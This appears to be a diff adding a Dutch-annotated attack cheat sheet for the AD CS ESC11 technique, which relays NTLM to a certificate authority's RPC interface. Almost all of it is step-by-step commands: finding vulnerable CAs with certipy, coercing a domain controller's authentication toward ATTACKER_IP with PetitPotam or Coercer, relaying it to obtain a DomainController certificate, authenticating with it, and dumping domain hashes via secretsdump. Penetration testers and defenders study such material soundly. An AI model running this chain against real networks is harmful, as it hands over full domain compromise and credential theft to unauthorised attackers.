@@ -1,0 +1,24 @@
+# AD CS ESC11 - NTLM Relay to AD CS RPC Endpoint (IF_ENFORCEENCRYPTICERTREQUEST)
+# CA heeft IF_ENFORCEENCRYPTICERTREQUEST NIET ingesteld op de RPC interface
+# Vergelijkbaar met ESC8, maar relay naar RPC (ICPR) in plaats van HTTP
+# Stap 1: Check of de CA kwetsbaar is
+certipy find -u user@domain.local -p Password123! -dc-ip DC_IP -vulnerable
+# Zoek naar: "Enforce Encryption for Requests: Disabled"
+# Of via registry op de CA:
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\domain-CA\InterfaceFlags"
+# IF_ENFORCEENCRYPTICERTREQUEST (0x200) NIET gezet = kwetsbaar
+# Stap 2: Start certipy relay in RPC modus
+certipy relay -ca ca-server -template DomainController
+# Stap 3: Trigger NTLM auth van DC
+python3 PetitPotam.py -u user -p Password123! -d domain.local ATTACKER_IP dc01.domain.local
+# Of via coerce tools:
+python3 Coercer.py -u user -p Password123! -d domain.local -l ATTACKER_IP -t dc01.domain.local
+# Stap 4: Certipy vangt de relay en vraagt certificaat aan via RPC
+# Output: .pfx certificaat
+# Stap 5: Authenticate
+certipy auth -pfx dc01.pfx -dc-ip DC_IP
+# DCSync met verkregen hash:
+impacket-secretsdump -hashes :NTHASH domain.local/dc01\$@dc01.domain.local
+# Tip: ESC11 werkt waar ESC8 niet werkt (als HTTP endpoints uit staan)
+# Tip: Vereist dat RPC signing niet enforced is
+# Tip: Certipy v4.8+ ondersteunt RPC relay
